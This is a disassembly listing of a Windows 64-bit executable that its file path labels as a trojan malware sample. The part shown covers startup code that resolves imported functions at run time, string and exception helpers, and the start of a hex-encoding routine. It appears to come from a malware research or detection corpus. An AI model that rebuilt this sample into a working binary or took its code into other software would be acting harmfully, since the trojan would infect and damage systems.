
malware_samples/trojan/252db6cdc155093aadf5be0ab000b02626b6450c0d90e30c4610546605ccb505.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 28          	sub    $0x28,%rsp
   140001004:	48 8d 0d ed 43 00 00 	lea    0x43ed(%rip),%rcx        # 0x1400053f8
   14000100b:	ff 15 37 40 00 00    	call   *0x4037(%rip)        # 0x140005048
   140001011:	48 89 05 38 77 00 00 	mov    %rax,0x7738(%rip)        # 0x140008750
   140001018:	48 85 c0             	test   %rax,%rax
   14000101b:	75 1c                	jne    0x140001039
   14000101d:	48 8b 0d bc 40 00 00 	mov    0x40bc(%rip),%rcx        # 0x1400050e0
   140001024:	e8 47 1e 00 00       	call   0x140002e70
   140001029:	48 8d 0d 30 3f 00 00 	lea    0x3f30(%rip),%rcx        # 0x140004f60
   140001030:	48 83 c4 28          	add    $0x28,%rsp
   140001034:	e9 eb 2f 00 00       	jmp    0x140004024
   140001039:	48 8d 15 20 44 00 00 	lea    0x4420(%rip),%rdx        # 0x140005460
   140001040:	48 8b c8             	mov    %rax,%rcx
   140001043:	ff 15 cf 3f 00 00    	call   *0x3fcf(%rip)        # 0x140005018
   140001049:	48 8b 0d 00 77 00 00 	mov    0x7700(%rip),%rcx        # 0x140008750
   140001050:	48 8d 15 29 44 00 00 	lea    0x4429(%rip),%rdx        # 0x140005480
   140001057:	48 89 05 0a 77 00 00 	mov    %rax,0x770a(%rip)        # 0x140008768
   14000105e:	ff 15 b4 3f 00 00    	call   *0x3fb4(%rip)        # 0x140005018
   140001064:	48 8b 0d e5 76 00 00 	mov    0x76e5(%rip),%rcx        # 0x140008750
   14000106b:	48 8d 15 1e 44 00 00 	lea    0x441e(%rip),%rdx        # 0x140005490
   140001072:	ff 15 a0 3f 00 00    	call   *0x3fa0(%rip)        # 0x140005018
   140001078:	48 8b 0d d1 76 00 00 	mov    0x76d1(%rip),%rcx        # 0x140008750
   14000107f:	48 8d 15 1a 44 00 00 	lea    0x441a(%rip),%rdx        # 0x1400054a0
   140001086:	48 89 05 cb 76 00 00 	mov    %rax,0x76cb(%rip)        # 0x140008758
   14000108d:	ff 15 85 3f 00 00    	call   *0x3f85(%rip)        # 0x140005018
   140001093:	48 8b 0d b6 76 00 00 	mov    0x76b6(%rip),%rcx        # 0x140008750
   14000109a:	48 8d 15 0f 44 00 00 	lea    0x440f(%rip),%rdx        # 0x1400054b0
   1400010a1:	ff 15 71 3f 00 00    	call   *0x3f71(%rip)        # 0x140005018
   1400010a7:	48 8b 0d a2 76 00 00 	mov    0x76a2(%rip),%rcx        # 0x140008750
   1400010ae:	48 8d 15 13 44 00 00 	lea    0x4413(%rip),%rdx        # 0x1400054c8
   1400010b5:	ff 15 5d 3f 00 00    	call   *0x3f5d(%rip)        # 0x140005018
   1400010bb:	48 8b 0d 8e 76 00 00 	mov    0x768e(%rip),%rcx        # 0x140008750
   1400010c2:	48 8d 15 0f 44 00 00 	lea    0x440f(%rip),%rdx        # 0x1400054d8
   1400010c9:	ff 15 49 3f 00 00    	call   *0x3f49(%rip)        # 0x140005018
   1400010cf:	48 8b 0d 7a 76 00 00 	mov    0x767a(%rip),%rcx        # 0x140008750
   1400010d6:	48 8d 15 0b 44 00 00 	lea    0x440b(%rip),%rdx        # 0x1400054e8
   1400010dd:	48 89 05 8c 76 00 00 	mov    %rax,0x768c(%rip)        # 0x140008770
   1400010e4:	ff 15 2e 3f 00 00    	call   *0x3f2e(%rip)        # 0x140005018
   1400010ea:	48 8b 0d 5f 76 00 00 	mov    0x765f(%rip),%rcx        # 0x140008750
   1400010f1:	48 8d 15 08 44 00 00 	lea    0x4408(%rip),%rdx        # 0x140005500
   1400010f8:	ff 15 1a 3f 00 00    	call   *0x3f1a(%rip)        # 0x140005018
   1400010fe:	48 8b 0d 4b 76 00 00 	mov    0x764b(%rip),%rcx        # 0x140008750
   140001105:	48 8d 15 04 44 00 00 	lea    0x4404(%rip),%rdx        # 0x140005510
   14000110c:	ff 15 06 3f 00 00    	call   *0x3f06(%rip)        # 0x140005018
   140001112:	48 8d 0d 47 3e 00 00 	lea    0x3e47(%rip),%rcx        # 0x140004f60
   140001119:	48 89 05 40 76 00 00 	mov    %rax,0x7640(%rip)        # 0x140008760
   140001120:	48 83 c4 28          	add    $0x28,%rsp
   140001124:	e9 fb 2e 00 00       	jmp    0x140004024
   140001129:	cc                   	int3
   14000112a:	cc                   	int3
   14000112b:	cc                   	int3
   14000112c:	cc                   	int3
   14000112d:	cc                   	int3
   14000112e:	cc                   	int3
   14000112f:	cc                   	int3
   140001130:	40 53                	rex push %rbx
   140001132:	48 83 ec 20          	sub    $0x20,%rsp
   140001136:	48 8b d9             	mov    %rcx,%rbx
   140001139:	48 8b c2             	mov    %rdx,%rax
   14000113c:	48 8d 0d 25 42 00 00 	lea    0x4225(%rip),%rcx        # 0x140005368
   140001143:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001146:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000114a:	48 89 0b             	mov    %rcx,(%rbx)
   14000114d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001151:	0f 11 02             	movups %xmm0,(%rdx)
   140001154:	ff 15 fe 3f 00 00    	call   *0x3ffe(%rip)        # 0x140005158
   14000115a:	48 8b c3             	mov    %rbx,%rax
   14000115d:	48 83 c4 20          	add    $0x20,%rsp
   140001161:	5b                   	pop    %rbx
   140001162:	c3                   	ret
   140001163:	cc                   	int3
   140001164:	cc                   	int3
   140001165:	cc                   	int3
   140001166:	cc                   	int3
   140001167:	cc                   	int3
   140001168:	cc                   	int3
   140001169:	cc                   	int3
   14000116a:	cc                   	int3
   14000116b:	cc                   	int3
   14000116c:	cc                   	int3
   14000116d:	cc                   	int3
   14000116e:	cc                   	int3
   14000116f:	cc                   	int3
   140001170:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001174:	48 8d 05 3d 42 00 00 	lea    0x423d(%rip),%rax        # 0x1400053b8
   14000117b:	48 85 d2             	test   %rdx,%rdx
   14000117e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001182:	c3                   	ret
   140001183:	cc                   	int3
   140001184:	cc                   	int3
   140001185:	cc                   	int3
   140001186:	cc                   	int3
   140001187:	cc                   	int3
   140001188:	cc                   	int3
   140001189:	cc                   	int3
   14000118a:	cc                   	int3
   14000118b:	cc                   	int3
   14000118c:	cc                   	int3
   14000118d:	cc                   	int3
   14000118e:	cc                   	int3
   14000118f:	cc                   	int3
   140001190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001195:	57                   	push   %rdi
   140001196:	48 83 ec 20          	sub    $0x20,%rsp
   14000119a:	48 8d 05 c7 41 00 00 	lea    0x41c7(%rip),%rax        # 0x140005368
   1400011a1:	48 8b f9             	mov    %rcx,%rdi
   1400011a4:	48 89 01             	mov    %rax,(%rcx)
   1400011a7:	8b da                	mov    %edx,%ebx
   1400011a9:	48 83 c1 08          	add    $0x8,%rcx
   1400011ad:	ff 15 ad 3f 00 00    	call   *0x3fad(%rip)        # 0x140005160
   1400011b3:	f6 c3 01             	test   $0x1,%bl
   1400011b6:	74 0d                	je     0x1400011c5
   1400011b8:	ba 18 00 00 00       	mov    $0x18,%edx
   1400011bd:	48 8b cf             	mov    %rdi,%rcx
   1400011c0:	e8 77 2e 00 00       	call   0x14000403c
   1400011c5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400011ca:	48 8b c7             	mov    %rdi,%rax
   1400011cd:	48 83 c4 20          	add    $0x20,%rsp
   1400011d1:	5f                   	pop    %rdi
   1400011d2:	c3                   	ret
   1400011d3:	cc                   	int3
   1400011d4:	cc                   	int3
   1400011d5:	cc                   	int3
   1400011d6:	cc                   	int3
   1400011d7:	cc                   	int3
   1400011d8:	cc                   	int3
   1400011d9:	cc                   	int3
   1400011da:	cc                   	int3
   1400011db:	cc                   	int3
   1400011dc:	cc                   	int3
   1400011dd:	cc                   	int3
   1400011de:	cc                   	int3
   1400011df:	cc                   	int3
   1400011e0:	48 8d 05 81 41 00 00 	lea    0x4181(%rip),%rax        # 0x140005368
   1400011e7:	48 89 01             	mov    %rax,(%rcx)
   1400011ea:	48 83 c1 08          	add    $0x8,%rcx
   1400011ee:	48 ff 25 6b 3f 00 00 	rex.W jmp *0x3f6b(%rip)        # 0x140005160
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 8d 05 c9 41 00 00 	lea    0x41c9(%rip),%rax        # 0x1400053d0
   140001207:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000120e:	00 
   14000120f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001213:	48 8d 05 8e 41 00 00 	lea    0x418e(%rip),%rax        # 0x1400053a8
   14000121a:	48 89 01             	mov    %rax,(%rcx)
   14000121d:	48 8b c1             	mov    %rcx,%rax
   140001220:	c3                   	ret
   140001221:	cc                   	int3
   140001222:	cc                   	int3
   140001223:	cc                   	int3
   140001224:	cc                   	int3
   140001225:	cc                   	int3
   140001226:	cc                   	int3
   140001227:	cc                   	int3
   140001228:	cc                   	int3
   140001229:	cc                   	int3
   14000122a:	cc                   	int3
   14000122b:	cc                   	int3
   14000122c:	cc                   	int3
   14000122d:	cc                   	int3
   14000122e:	cc                   	int3
   14000122f:	cc                   	int3
   140001230:	48 83 ec 48          	sub    $0x48,%rsp
   140001234:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001239:	e8 c2 ff ff ff       	call   0x140001200
   14000123e:	48 8d 15 d3 55 00 00 	lea    0x55d3(%rip),%rdx        # 0x140006818
   140001245:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000124a:	e8 13 38 00 00       	call   0x140004a62
   14000124f:	cc                   	int3
   140001250:	40 53                	rex push %rbx
   140001252:	48 83 ec 20          	sub    $0x20,%rsp
   140001256:	48 8b d9             	mov    %rcx,%rbx
   140001259:	48 8b c2             	mov    %rdx,%rax
   14000125c:	48 8d 0d 05 41 00 00 	lea    0x4105(%rip),%rcx        # 0x140005368
   140001263:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001266:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000126a:	48 89 0b             	mov    %rcx,(%rbx)
   14000126d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001271:	0f 11 02             	movups %xmm0,(%rdx)
   140001274:	ff 15 de 3e 00 00    	call   *0x3ede(%rip)        # 0x140005158
   14000127a:	48 8d 05 27 41 00 00 	lea    0x4127(%rip),%rax        # 0x1400053a8
   140001281:	48 89 03             	mov    %rax,(%rbx)
   140001284:	48 8b c3             	mov    %rbx,%rax
   140001287:	48 83 c4 20          	add    $0x20,%rsp
   14000128b:	5b                   	pop    %rbx
   14000128c:	c3                   	ret
   14000128d:	cc                   	int3
   14000128e:	cc                   	int3
   14000128f:	cc                   	int3
   140001290:	40 53                	rex push %rbx
   140001292:	48 83 ec 20          	sub    $0x20,%rsp
   140001296:	48 8b d9             	mov    %rcx,%rbx
   140001299:	48 8b c2             	mov    %rdx,%rax
   14000129c:	48 8d 0d c5 40 00 00 	lea    0x40c5(%rip),%rcx        # 0x140005368
   1400012a3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012a6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400012aa:	48 89 0b             	mov    %rcx,(%rbx)
   1400012ad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400012b1:	0f 11 02             	movups %xmm0,(%rdx)
   1400012b4:	ff 15 9e 3e 00 00    	call   *0x3e9e(%rip)        # 0x140005158
   1400012ba:	48 8d 05 bf 40 00 00 	lea    0x40bf(%rip),%rax        # 0x140005380
   1400012c1:	48 89 03             	mov    %rax,(%rbx)
   1400012c4:	48 8b c3             	mov    %rbx,%rax
   1400012c7:	48 83 c4 20          	add    $0x20,%rsp
   1400012cb:	5b                   	pop    %rbx
   1400012cc:	c3                   	ret
   1400012cd:	cc                   	int3
   1400012ce:	cc                   	int3
   1400012cf:	cc                   	int3
   1400012d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400012d4:	48 8d 0d 0d 41 00 00 	lea    0x410d(%rip),%rcx        # 0x1400053e8
   1400012db:	ff 15 0f 3e 00 00    	call   *0x3e0f(%rip)        # 0x1400050f0
   1400012e1:	cc                   	int3
   1400012e2:	cc                   	int3
   1400012e3:	cc                   	int3
   1400012e4:	cc                   	int3
   1400012e5:	cc                   	int3
   1400012e6:	cc                   	int3
   1400012e7:	cc                   	int3
   1400012e8:	cc                   	int3
   1400012e9:	cc                   	int3
   1400012ea:	cc                   	int3
   1400012eb:	cc                   	int3
   1400012ec:	cc                   	int3
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400012f5:	56                   	push   %rsi
   1400012f6:	48 83 ec 20          	sub    $0x20,%rsp
   1400012fa:	48 8b 41 28          	mov    0x28(%rcx),%rax
   1400012fe:	49 8b e8             	mov    %r8,%rbp
   140001301:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001306:	48 8b f1             	mov    %rcx,%rsi
   140001309:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   14000130e:	48 8d 59 10          	lea    0x10(%rcx),%rbx
   140001312:	4c 8b f2             	mov    %rdx,%r14
   140001315:	49 8d 50 03          	lea    0x3(%r8),%rdx
   140001319:	48 d1 ea             	shr    $1,%rdx
   14000131c:	48 3b d0             	cmp    %rax,%rdx
   14000131f:	77 3a                	ja     0x14000135b
   140001321:	4c 8b c3             	mov    %rbx,%r8
   140001324:	48 83 f8 07          	cmp    $0x7,%rax
   140001328:	76 03                	jbe    0x14000132d
   14000132a:	4c 8b 03             	mov    (%rbx),%r8
   14000132d:	45 33 c9             	xor    %r9d,%r9d
   140001330:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   140001334:	48 85 d2             	test   %rdx,%rdx
   140001337:	74 17                	je     0x140001350
   140001339:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   14000133e:	48 8b ca             	mov    %rdx,%rcx
   140001341:	49 8b f8             	mov    %r8,%rdi
   140001344:	41 0f b7 c1          	movzwl %r9w,%eax
   140001348:	66 f3 ab             	rep stos %ax,(%rdi)
   14000134b:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140001350:	66 45 89 0c 50       	mov    %r9w,(%r8,%rdx,2)
   140001355:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140001359:	eb 0b                	jmp    0x140001366
   14000135b:	48 8b cb             	mov    %rbx,%rcx
   14000135e:	e8 7d 1e 00 00       	call   0x1400031e0
   140001363:	48 8b c3             	mov    %rbx,%rax
   140001366:	48 83 7b 18 07       	cmpq   $0x7,0x18(%rbx)
   14000136b:	76 03                	jbe    0x140001370
   14000136d:	48 8b 1b             	mov    (%rbx),%rbx
   140001370:	48 85 ed             	test   %rbp,%rbp
   140001373:	74 20                	je     0x140001395
   140001375:	4c 2b f3             	sub    %rbx,%r14
   140001378:	48 8b cd             	mov    %rbp,%rcx
   14000137b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001380:	41 0f b6 04 1e       	movzbl (%r14,%rbx,1),%eax
   140001385:	88 03                	mov    %al,(%rbx)
   140001387:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   14000138b:	48 83 e9 01          	sub    $0x1,%rcx
   14000138f:	75 ef                	jne    0x140001380
   140001391:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140001395:	48 83 78 18 07       	cmpq   $0x7,0x18(%rax)
   14000139a:	4c 8b 74 24 40       	mov    0x40(%rsp),%r14
   14000139f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400013a4:	76 03                	jbe    0x1400013a9
   1400013a6:	48 8b 00             	mov    (%rax),%rax
   1400013a9:	48 89 46 08          	mov    %rax,0x8(%rsi)
   1400013ad:	0f b7 46 20          	movzwl 0x20(%rsi),%eax
   1400013b1:	66 03 c0             	add    %ax,%ax
   1400013b4:	66 89 2e             	mov    %bp,(%rsi)
   1400013b7:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400013bc:	66 89 46 02          	mov    %ax,0x2(%rsi)
   1400013c0:	48 83 c4 20          	add    $0x20,%rsp
   1400013c4:	5e                   	pop    %rsi
   1400013c5:	c3                   	ret
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	40 56                	rex push %rsi
   1400013d2:	57                   	push   %rdi
   1400013d3:	41 54                	push   %r12
   1400013d5:	41 55                	push   %r13
   1400013d7:	41 57                	push   %r15
   1400013d9:	48 83 ec 40          	sub    $0x40,%rsp
   1400013dd:	4c 8b fa             	mov    %rdx,%r15
   1400013e0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400013e5:	4d 8b 67 10          	mov    0x10(%r15),%r12
   1400013e9:	4d 8d 6f 10          	lea    0x10(%r15),%r13
   1400013ed:	33 d2                	xor    %edx,%edx
   1400013ef:	48 8d 71 10          	lea    0x10(%rcx),%rsi
   1400013f3:	48 b8 fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rax
   1400013fa:	ff ff 7f 
   1400013fd:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140001402:	48 8b f9             	mov    %rcx,%rdi
   140001405:	4c 3b e0             	cmp    %rax,%r12
   140001408:	0f 84 44 01 00 00    	je     0x140001552
   14000140e:	49 83 7f 18 07       	cmpq   $0x7,0x18(%r15)
   140001413:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   14000141a:	00 
   14000141b:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   140001420:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140001425:	76 03                	jbe    0x14000142a
   140001427:	4d 8b 3f             	mov    (%r15),%r15
   14000142a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000142d:	49 8d 6c 24 01       	lea    0x1(%r12),%rbp
   140001432:	0f 11 06             	movups %xmm0,(%rsi)
   140001435:	bb 07 00 00 00       	mov    $0x7,%ebx
   14000143a:	48 89 56 10          	mov    %rdx,0x10(%rsi)
   14000143e:	48 89 56 18          	mov    %rdx,0x18(%rsi)
   140001442:	4c 8b f6             	mov    %rsi,%r14
   140001445:	48 3b eb             	cmp    %rbx,%rbp
   140001448:	0f 86 92 00 00 00    	jbe    0x1400014e0
   14000144e:	48 8b dd             	mov    %rbp,%rbx
   140001451:	48 83 cb 07          	or     $0x7,%rbx
   140001455:	48 3b d8             	cmp    %rax,%rbx
   140001458:	76 13                	jbe    0x14000146d
   14000145a:	48 8b d8             	mov    %rax,%rbx
   14000145d:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140001464:	ff ff 7f 
   140001467:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   14000146b:	eb 2f                	jmp    0x14000149c
   14000146d:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001472:	48 3b d8             	cmp    %rax,%rbx
   140001475:	48 0f 42 d8          	cmovb  %rax,%rbx
   140001479:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140001480:	ff ff 7f 
   140001483:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140001487:	48 3b c8             	cmp    %rax,%rcx
   14000148a:	0f 87 c8 00 00 00    	ja     0x140001558
   140001490:	48 03 c9             	add    %rcx,%rcx
   140001493:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000149a:	72 2f                	jb     0x1400014cb
   14000149c:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400014a0:	48 3b c1             	cmp    %rcx,%rax
   1400014a3:	0f 86 af 00 00 00    	jbe    0x140001558
   1400014a9:	48 8b c8             	mov    %rax,%rcx
   1400014ac:	e8 0f 29 00 00       	call   0x140003dc0
   1400014b1:	48 85 c0             	test   %rax,%rax
   1400014b4:	74 0e                	je     0x1400014c4
   1400014b6:	4c 8d 70 27          	lea    0x27(%rax),%r14
   1400014ba:	49 83 e6 e0          	and    $0xffffffffffffffe0,%r14
   1400014be:	49 89 46 f8          	mov    %rax,-0x8(%r14)
   1400014c2:	eb 19                	jmp    0x1400014dd
   1400014c4:	ff 15 46 3d 00 00    	call   *0x3d46(%rip)        # 0x140005210
   1400014ca:	cc                   	int3
   1400014cb:	48 85 c9             	test   %rcx,%rcx
   1400014ce:	74 0a                	je     0x1400014da
   1400014d0:	e8 eb 28 00 00       	call   0x140003dc0
   1400014d5:	4c 8b f0             	mov    %rax,%r14
   1400014d8:	eb 03                	jmp    0x1400014dd
   1400014da:	4c 8b f2             	mov    %rdx,%r14
   1400014dd:	4c 89 36             	mov    %r14,(%rsi)
   1400014e0:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400014e4:	49 8b d7             	mov    %r15,%rdx
   1400014e7:	4b 8d 1c 24          	lea    (%r12,%r12,1),%rbx
   1400014eb:	48 89 6e 10          	mov    %rbp,0x10(%rsi)
   1400014ef:	4c 8b c3             	mov    %rbx,%r8
   1400014f2:	49 8b ce             	mov    %r14,%rcx
   1400014f5:	e8 0d 37 00 00       	call   0x140004c07
   1400014fa:	33 c0                	xor    %eax,%eax
   1400014fc:	66 42 89 04 33       	mov    %ax,(%rbx,%r14,1)
   140001501:	66 41 89 04 6e       	mov    %ax,(%r14,%rbp,2)
   140001506:	c7 47 30 01 00 00 00 	movl   $0x1,0x30(%rdi)
   14000150d:	48 83 7e 18 07       	cmpq   $0x7,0x18(%rsi)
   140001512:	49 8b 45 00          	mov    0x0(%r13),%rax
   140001516:	76 03                	jbe    0x14000151b
   140001518:	48 8b 36             	mov    (%rsi),%rsi
   14000151b:	0f b7 4f 20          	movzwl 0x20(%rdi),%ecx
   14000151f:	66 03 c0             	add    %ax,%ax
   140001522:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140001527:	66 03 c9             	add    %cx,%cx
   14000152a:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140001531:	00 
   140001532:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   140001537:	66 89 07             	mov    %ax,(%rdi)
   14000153a:	48 8b c7             	mov    %rdi,%rax
   14000153d:	66 89 4f 02          	mov    %cx,0x2(%rdi)
   140001541:	48 89 77 08          	mov    %rsi,0x8(%rdi)
   140001545:	48 83 c4 40          	add    $0x40,%rsp
   140001549:	41 5f                	pop    %r15
   14000154b:	41 5d                	pop    %r13
   14000154d:	41 5c                	pop    %r12
   14000154f:	5f                   	pop    %rdi
   140001550:	5e                   	pop    %rsi
   140001551:	c3                   	ret
   140001552:	e8 79 fd ff ff       	call   0x1400012d0
   140001557:	cc                   	int3
   140001558:	e8 d3 fc ff ff       	call   0x140001230
   14000155d:	cc                   	int3
   14000155e:	cc                   	int3
   14000155f:	cc                   	int3
   140001560:	0f b7 01             	movzwl (%rcx),%eax
   140001563:	83 f8 02             	cmp    $0x2,%eax
   140001566:	72 0f                	jb     0x140001577
   140001568:	8b d0                	mov    %eax,%edx
   14000156a:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000156e:	48 d1 ea             	shr    $1,%rdx
   140001571:	0f b7 44 50 fe       	movzwl -0x2(%rax,%rdx,2),%eax
   140001576:	c3                   	ret
   140001577:	33 c0                	xor    %eax,%eax
   140001579:	c3                   	ret
   14000157a:	cc                   	int3
   14000157b:	cc                   	int3
   14000157c:	cc                   	int3
   14000157d:	cc                   	int3
   14000157e:	cc                   	int3
   14000157f:	cc                   	int3
   140001580:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140001585:	55                   	push   %rbp
   140001586:	56                   	push   %rsi
   140001587:	57                   	push   %rdi
   140001588:	41 54                	push   %r12
   14000158a:	41 55                	push   %r13
   14000158c:	41 56                	push   %r14
   14000158e:	41 57                	push   %r15
   140001590:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   140001595:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   14000159c:	48 8b 05 9d 6a 00 00 	mov    0x6a9d(%rip),%rax        # 0x140008040
   1400015a3:	48 33 c4             	xor    %rsp,%rax
   1400015a6:	48 89 45 40          	mov    %rax,0x40(%rbp)
   1400015aa:	48 8b fa             	mov    %rdx,%rdi
   1400015ad:	4c 8b f9             	mov    %rcx,%r15
   1400015b0:	48 89 54 24 30       	mov    %rdx,0x30(%rsp)
   1400015b5:	45 33 f6             	xor    %r14d,%r14d
   1400015b8:	8b 51 30             	mov    0x30(%rcx),%edx
   1400015bb:	85 d2                	test   %edx,%edx
   1400015bd:	0f 84 bf 07 00 00    	je     0x140001d82
   1400015c3:	83 ea 01             	sub    $0x1,%edx
   1400015c6:	0f 84 4d 07 00 00    	je     0x140001d19
   1400015cc:	83 ea 01             	sub    $0x1,%edx
   1400015cf:	0f 84 44 07 00 00    	je     0x140001d19
   1400015d5:	83 ea 01             	sub    $0x1,%edx
   1400015d8:	0f 84 53 05 00 00    	je     0x140001b31
   1400015de:	83 fa 01             	cmp    $0x1,%edx
   1400015e1:	0f 85 9b 07 00 00    	jne    0x140001d82
   1400015e7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400015ea:	66 83 39 04          	cmpw   $0x4,(%rcx)
   1400015ee:	73 19                	jae    0x140001609
   1400015f0:	0f 11 07             	movups %xmm0,(%rdi)
   1400015f3:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   1400015f7:	b9 07 00 00 00       	mov    $0x7,%ecx
   1400015fc:	48 89 4f 18          	mov    %rcx,0x18(%rdi)
   140001600:	66 44 89 37          	mov    %r14w,(%rdi)
   140001604:	e9 9c 07 00 00       	jmp    0x140001da5
   140001609:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   14000160d:	0f b6 1e             	movzbl (%rsi),%ebx
   140001610:	8b c3                	mov    %ebx,%eax
   140001612:	48 c1 e8 04          	shr    $0x4,%rax
   140001616:	4c 8d 2d 4b 42 00 00 	lea    0x424b(%rip),%r13        # 0x140005868
   14000161d:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140001621:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001624:	f3 0f 7f 4d 10       	movdqu %xmm1,0x10(%rbp)
   140001629:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000162f:	41 0f b7 54 45 00    	movzwl 0x0(%r13,%rax,2),%edx
   140001635:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140001639:	e8 12 1d 00 00       	call   0x140003350
   14000163e:	90                   	nop
   14000163f:	83 e3 0f             	and    $0xf,%ebx
   140001642:	45 0f b7 4c 5d 00    	movzwl 0x0(%r13,%rbx,2),%r9d
   140001648:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   14000164c:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140001650:	48 3b ca             	cmp    %rdx,%rcx
   140001653:	73 22                	jae    0x140001677
   140001655:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140001659:	48 89 45 10          	mov    %rax,0x10(%rbp)
   14000165d:	48 8d 45 00          	lea    0x0(%rbp),%rax
   140001661:	48 83 fa 07          	cmp    $0x7,%rdx
   140001665:	48 0f 47 45 00       	cmova  0x0(%rbp),%rax
   14000166a:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   14000166f:	66 44 89 74 48 02    	mov    %r14w,0x2(%rax,%rcx,2)
   140001675:	eb 09                	jmp    0x140001680
   140001677:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000167b:	e8 50 1f 00 00       	call   0x1400035d0
   140001680:	0f 10 45 00          	movups 0x0(%rbp),%xmm0
   140001684:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140001689:	0f 10 4d 10          	movups 0x10(%rbp),%xmm1
   14000168d:	0f 11 4c 24 68       	movups %xmm1,0x68(%rsp)
   140001692:	0f b6 5e 01          	movzbl 0x1(%rsi),%ebx
   140001696:	8b c3                	mov    %ebx,%eax
   140001698:	48 c1 e8 04          	shr    $0x4,%rax
   14000169c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000169f:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   1400016a3:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400016a6:	f3 0f 7f 4d 10       	movdqu %xmm1,0x10(%rbp)
   1400016ab:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400016b1:	41 0f b7 54 45 00    	movzwl 0x0(%r13,%rax,2),%edx
   1400016b7:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400016bb:	e8 90 1c 00 00       	call   0x140003350
   1400016c0:	90                   	nop
   1400016c1:	83 e3 0f             	and    $0xf,%ebx
   1400016c4:	45 0f b7 4c 5d 00    	movzwl 0x0(%r13,%rbx,2),%r9d
   1400016ca:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   1400016ce:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   1400016d2:	48 3b ca             	cmp    %rdx,%rcx
   1400016d5:	73 22                	jae    0x1400016f9
   1400016d7:	48 8d 41 01          	lea    0x1(%rcx),%rax
